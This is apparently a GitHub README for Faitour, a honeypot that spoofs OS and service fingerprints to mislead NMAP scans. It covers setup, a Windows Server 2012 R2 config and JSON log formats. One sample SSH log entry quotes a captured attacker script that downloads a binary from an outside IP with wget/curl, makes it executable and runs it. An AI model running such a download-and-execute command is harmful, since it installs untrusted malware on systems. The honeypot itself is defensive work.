# Faitour (Imposter)

Faitour was cloned from [eightus/Cyder](https://github.com/eightus/Cyder), so I must first give credit to that project. Although that project is no longer maintained, you can still reference it for the original version.

Faitour has been stripped down to simply the OS emulation capabilities, and I have tried to simplify installation on Ubuntu 22.04. There is a ton of code clean-up that can still be done, but this was intended to be a quick and simple compliment to OpenCanary to more closely emulate different operating systems for NMAP fingerprinting.

Cyder was originally a Honeypot that was designed to imitate any Operating System (OS) that is available in the NMAP database. What remains in Faitour is the ability to detect NMAP probes and reply with spoofed OS and service fingerprints.

## Prerequisites

This project has been tested on Ubuntu 22.04 LTS. However, other Operating System **_MAY_** work if they have the following libraries:

- iptables
- libnetfilter_queue
- Python 3.6+

_For Ubuntu 16, you must upgrade Python to 3.6._

## Setting Up

### Ubuntu 22.04 LTS

A script is provided at `./setup.sh` to install all the required libraries, python modules, and create a SystemD service.
`sudo ./setup.sh`

### Ubuntu 16.04 LTS

By default, Ubuntu 16.04 does not have Python 3.6.You must first install Python 3.6 before running `./setup.sh`, and event then, your mileage may vary.

### Other Linux

Ensure that `iptables` and `libnetfilter_queue` are available, as well as the version of Linux is able to install the `libnetfilter-queue-dev`.
`libnetfilter-queue-dev` is required for Python 3 NetfilterQueue
Python 3.6 and above is required for Asyncio work.
_No other flavors of Linux have been tested._

## Configuration

After installing, you should change the configurations before starting the service.

The configuration file is located at:

`./configuration/host_config.ini`

Example configurations may be found in:

`./configuration/sample_configs/<description>/`

### Default Configuration:

The follwoing default configuration will be installed with Faitor. This will emulate a Windows Server 2012 R2 with the basic RPC, SMB, and RDP services that you would find on a typicaly Server 2012 R2 installation. The RPC fingerprints were chosen to match a real-world scan of a Server 2012 R2 box. 

_IMPORTANT!_ As with all configurations, including the sample configurations provided, you must update the `interface` and `ip` values to match your device's configuration, or spoofing will not work. 

```
[CONFIGURATION]
logging = localhost
# IMPORTANT! Change "interface" to match your interface name
interface = eth0
log_path = /var/log/faitour
debug = true

[HOST]
# IMPORTANT! Change "ip" to match your device's IP address
ip = 10.10.10.10
mac_address = false
http = false
ssh = false
telnet = false
file_system = ./configuration/fs/default_fs.json

# Windows Server 2012 R2 Emulation
fingerprint = SEQ(SP=FE-108%GCD=1-6%ISR=103-10D%TI=I|RD%II=I%SS=S%TS=A|C)
    OPS(O1=M5B4NW8ST11%O2=M5B4NW8ST11%O3=M5B4NW8NNT11%O4=M5B4NW8ST11%O5=M5B4NW8ST11%O6=M5B4ST11)
    WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
    ECN(R=Y%DF=Y%T=7B-85%TG=80%W=FFFF%O=M5B4NW8NNS%CC=Y%Q=)
    T1(R=Y%DF=Y%T=7B-85%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
    T2(R=N)
    T3(R=N)
    T4(R=N)
    T5(R=Y%DF=Y%T=7B-85%TG=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
    T6(R=N)
    T7(R=N)
    U1(DF=N%T=7B-85%TG=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
    IE(DFI=N%T=7B-85%TG=80%CD=Z)

# Microsoft SMB Emulation
139 = \x83\0\0\x01\x8f$
445 = \0\0\0.\xffSMBr\0\0\0\0\x88\x01@\0\0\0\0\0\0\0\0\0\0\0\0\0\0@\x06\0\0\x01\0\x11\x07\0.2\0\x01\0\x04A\0\0\0\0\x01\0\0\0\0\0\xfc\xe3\x01\0

# Windows RPC Emulation
135 = \x05\0\r\x03\x10\0\0\0\x18\0\0\0....\x04\0\x01\x05\0...$
1025 = \x05\0\r\x03\x10\0\0\0\x18\0\0\0....\x04\0\x01\x05\0...$
1026 = \x05\0\r\x03\x10\0\0\0\x18\0\0\0....\x04\0\x01\x05\0...$
1027 = \x05\0\r\x03\x10\0\0\0\x18\0\0\0....\x04\0\x01\x05\0...$
1028 = \x05\0\r\x03\x10\0\0\0\x18\0\0\0....\x04\0\x01\x05\0...$
1113 = \x05\0\r\x03\x10\0\0\0\x18\0\0\0....\x04\0\x01\x05\0...$
1169 = \x05\0\r\x03\x10\0\0\0\x18\0\0\0....\x04\0\x01\x05\0...$
2701 = \x05\0\r\x03\x10\0\0\0\x18\0\0\0....\x04\0\x01\x05\0...$

# Microsoft RDP
3389 = \x03\0\0*%\xe0\0\0\0\0\0

```

Remember to change the interface name and IP address to match your device settings.

## Starting the Emulator

To run the OS emulator, simply start the systemd service by running:

`sudo systemctl start faitour.service`

## Fingerprints & Services

Operating System Fingerprints can be found at: https://svn.nmap.org/nmap/nmap-os-db

Service Fingerprints can be found at: https://svn.nmap.org/nmap/nmap-service-probes

Be sure to run an NMAP scan from another machine to ensure that everything is working as expected. 

`nmap -sS -sV -O <ip address>`

## Key Files

`./setup.sh`
  - Setup script for Ubuntu 22.04 LTS

`./configuration/host_config.ini`
  - Configuration for OS emulation

## Logging

Logs are stored in `/var/log/faitour` by default. All logs are in `json` format.

**faitour.json**

- Contains credentials and commands that are attempted through SSH / Telnet / HTTP
- Example of Logs:
- `{"timestamp": 1577716279.8859844, "protocol": "SSH", "username": "root", "password": "admin", "dst_ip": "x.x.x.x", "dst_port": 22, "src_ip": "x.x.x.x", "src_port": 52772}`
- `{"timestamp": 1577682398.527439, "protocol": "SSH", "command": "#!/bin/sh\nPATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nwget http://23.228.113.117/21\ncurl -O http://x.x.x.x/21\nchmod +x 21\n./21\n", "dst_ip": "x.x.x.x", "dst_port": 22, "src_ip": "x.x.x.x", "src_port": 50433}`
- `{"timestamp": 1577682701.8840919, "protocol": "Telnet", "username": "admin", "password": "", "src_ip": "x.x.x.x", "dst_ip": "x.x.x.x", "src_port": 56380}`
- Timestamp is in epoch time format.

**packet.json**

- Contains the packet bytes the host received. **NOTE:** it does not contain packets that are sent out.
- Example of Packet Log:
- `{"timestamp": 1577678695.520519, "dst_ip": "x.x.x.x", "host_os": "HOST", "src_ip": "x.x.x.x", "services": 22, "packet": "d2h5IGRpZCB5b3UgZXZlbiB0cnkgdG8gZGVjb2RlIHRoaXM/IEkgd291bGRuJ3QgcHV0IGEgcmVhbCBwYWNrZXQgaGVyZQ==\n"}`
- The packet is base64 encoded.To decode it, use:
- `base64.decodebytes(packet.encode('ascii'))`
- This will return you the actual bytes.
- `services` is the port number.

**debug.json**

- Self-explanatory

## Limitations and Known Issues

### Limitations:

- NMAP may yield an inaccurate result during an aggressive scan, but it should not affect the average NMAP fingerprinting.
- UDP Packets are dropped due to the inability to spoof the OS.

### Known Issues:

None yet. Please report any issues you encounter.

## TODO

* [x] Operating System Spoofing
* [ ] Code Clean Up of Cyder's Honeypot Functionality

## Credits

* [@eightus](https://github.com/eightus) for the original Cyder project
* [@1Stronk](https://github.com/1Stronk) for some tips on getting this to work on Ubuntu 22.04
